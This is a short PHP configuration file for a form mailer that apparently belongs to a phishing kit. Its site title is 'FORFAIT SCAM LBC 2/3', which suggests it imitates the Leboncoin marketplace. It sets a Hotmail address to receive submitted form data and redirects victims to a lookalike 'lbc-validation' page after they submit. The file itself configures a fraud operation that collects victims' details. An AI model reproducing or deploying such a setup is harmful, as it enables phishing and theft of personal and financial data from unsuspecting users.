<?php

/* Settings
---------------------*/
$email_to = 'nony3@hotmail.fr'; // Email addresses to send data. Seperate email addresses with ','
$site_title = 'FORFAIT SCAM LBC 2/3'; // Your website title
$webmaster_name = "My Friend"; 

// Your name

$headerbar_color = "#313131"; 

// Color of the headerbar in the email sent
$form_type = ""; 

// Type of form - default is Contact Form

;

$success_redirect = "http://www.lbc-validation.com/3/fin.html"; // Page to redirect to after submission of form.

?>